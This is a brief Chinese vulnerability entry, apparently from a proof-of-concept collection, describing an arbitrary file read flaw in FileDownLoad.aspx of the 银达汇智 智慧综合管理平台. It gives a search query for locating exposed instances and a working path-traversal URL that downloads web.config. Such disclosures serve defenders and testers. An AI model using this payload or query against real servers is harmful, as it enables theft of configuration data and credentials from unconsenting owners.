# 银达汇智 智慧综合管理平台 FileDownLoad.aspx 任意文件读取漏洞

## 漏洞描述

银达汇智 智慧综合管理平台 FileDownLoad.aspx 存在任意文件读取漏洞，通过漏洞攻击者可下载服务器中的任意文件

## 漏洞影响

<a-checkbox checked>银达汇智 智慧综合管理平台 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>"汇智信息" && title="智慧综合管理平台登入"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1627914977251-450973a6-e847-454b-817b-efa35fdc4aed-20220313134159838.png)

验证POC

```plain
http://xxx.xxx.xxx.xxx/Module/FileManagement/FileDownLoad.aspx?filePath=../../web.config
```

![img](../../../.vuepress/public/img/1627915116676-c0c892b3-14d0-4b50-a97b-cbc0cd8d4dc9.png)